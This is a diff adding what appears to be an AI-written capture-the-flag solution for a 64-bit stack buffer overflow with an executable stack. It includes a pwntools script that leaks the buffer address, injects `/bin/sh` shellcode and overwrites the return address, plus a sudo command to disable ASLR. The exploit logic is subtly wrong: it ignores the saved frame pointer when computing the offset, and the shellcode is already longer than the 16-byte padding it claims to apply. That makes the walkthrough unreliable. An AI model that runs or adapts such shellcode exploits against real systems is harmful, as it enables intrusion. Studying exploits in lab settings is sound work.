@@ -1,0 +1,92 @@
+To solve this challenge using `pwntools`, you need to exploit the binary by leveraging the lack of NX (No eXecute) protection and the buffer overflow vulnerability. Since NX is disabled, you can inject shellcode into the buffer and execute it. Here's how you can approach the challenge step by step:
+
+---
+
+### Steps to Solve the Challenge:
+
+1. **Analyze the Binary**:
+   - The binary is a 64-bit ELF file with no stack canary, no NX, no PIE, and partial RELRO. This means the stack is executable, and you can directly execute shellcode placed in the buffer.
+
+2. **Understand the Vulnerability**:
+   - The `read` function reads up to 0x400 (1024) bytes into a buffer of size 16 bytes (`buf[2]` is 16 bytes). This is a classic buffer overflow vulnerability.
+   - The program prints the address of the buffer (`buf`) using `printf("What is it : [%p] ?\n", buf);`. This gives you the address where you can inject your shellcode.
+
+3. **Plan the Exploit**:
+   - Inject shellcode into the buffer.
+   - Overwrite the return address of the `main` function with the address of the buffer (where the shellcode resides).
+   - When the function returns, it will jump to the shellcode and execute it.
+
+4. **Write the Exploit Script**:
+   - Use `pwntools` to automate the exploitation process.
+   - Generate shellcode using `asm` from `pwntools` or use pre-generated shellcode (e.g., `/bin/sh` shellcode).
+   - Leak the buffer address, inject the shellcode, and overwrite the return address.
+
+---
+
+### Exploit Code:
+
+Here is the Python script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary and context
+binary = './rop'
+elf = ELF(binary)
+context.binary = binary
+context.terminal = ['tmux', 'splitw', '-h']
+
+# Start the process
+p = process(binary)
+
+# Step 1: Leak the buffer address
+p.recvuntil("What is it : [")
+buf_address = int(p.recvuntil("] ?", drop=True), 16)
+log.info(f"Buffer address: {hex(buf_address)}")
+
+# Step 2: Create the shellcode
+# Use pwntools to generate shellcode for spawning a shell
+shellcode = asm(shellcraft.sh())
+
+# Step 3: Construct the payload
+# Fill the buffer (16 bytes) + overwrite the return address with buf_address
+payload = shellcode.ljust(16, b'\x90')  # NOP sled to align
+payload += p64(buf_address)  # Overwrite return address with buf_address
+
+# Step 4: Send the payload
+p.recvuntil("Input someting : ")
+p.sendline(payload)
+
+# Step 5: Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code:
+
+1. **Leak the Buffer Address**:
+   - The program prints the address of the buffer. We parse this address using `recvuntil` and convert it to an integer.
+
+2. **Generate Shellcode**:
+   - Use `asm(shellcraft.sh())` to generate shellcode for spawning a `/bin/sh` shell. This is a standard shellcode provided by `pwntools`.
+
+3. **Construct the Payload**:
+   - The payload consists of:
+     - The shellcode, padded with NOPs (`\x90`) to fill the buffer.
+     - The address of the buffer, which overwrites the return address.
+
+4. **Send the Payload**:
+   - Send the payload to the program using `sendline`.
+
+5. **Interact with the Shell**:
+   - After the payload is executed, the program will spawn a shell. Use `interactive()` to interact with it.
+
+---
+
+### Notes:
+- Ensure that the binary is running locally or on a remote server. If it's remote, replace `process(binary)` with `remote('host', port)`.
+- If ASLR is enabled on your system, disable it using `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` for local testing.
+- Test the exploit thoroughly to ensure it works as expected.
+
+Good luck with the challenge!
